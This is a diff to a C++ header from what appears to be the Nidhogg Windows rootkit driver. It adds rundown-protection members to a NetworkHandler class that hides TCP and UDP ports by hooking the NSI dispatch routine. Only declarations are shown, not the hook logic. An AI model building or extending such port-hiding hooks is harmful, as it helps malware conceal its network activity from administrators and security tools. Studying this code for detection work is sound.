@@ -8,6 +8,7 @@ extern "C" {
 	#include "NidhoggCommon.h"
 }
 #include "ListHelper.hpp"
+#include "RundownProtection.h"
 
 constexpr USHORT MAX_PORT_NUMBER = 65535;
 constexpr ULONG IOCTL_NSI_ENUMERATE_OBJECTS_ALL_PARAMETERS = 0x12001B;
@@ -27,9 +28,12 @@ struct HiddenPorts {
 	PLIST_ENTRY Items;
 };
 
+class NetworkHandler;
+
 struct HookedCompletionRoutine {
 	PIO_COMPLETION_ROUTINE OriginalCompletionRoutine;
 	PVOID OriginalContext;
+	NetworkHandler* Handler;
 };
 
 _IRQL_requires_max_(APC_LEVEL)
@@ -53,6 +57,7 @@ private:
 	HiddenPorts hiddenTcpPorts;
 	HiddenPorts hiddenUdpPorts;
 	PVOID originalNsiDispatchAddress;
+	RundownProtection rundown;
 
 	_IRQL_requires_max_(APC_LEVEL)
 	NTSTATUS InstallNsiHook(_In_ bool remove = false);
@@ -88,6 +93,12 @@ public:
 
 	_IRQL_requires_max_(APC_LEVEL)
 	bool ListHiddenPorts(_Inout_ IoctlHiddenPorts* hiddenPorts) const;
+
+	_IRQL_requires_max_(DISPATCH_LEVEL)
+	bool AcquireRundown();
+
+	_IRQL_requires_max_(DISPATCH_LEVEL)
+	void ReleaseRundown();
 
 	PVOID GetOriginalCallback() const { return this->originalNsiDispatchAddress; }
 };
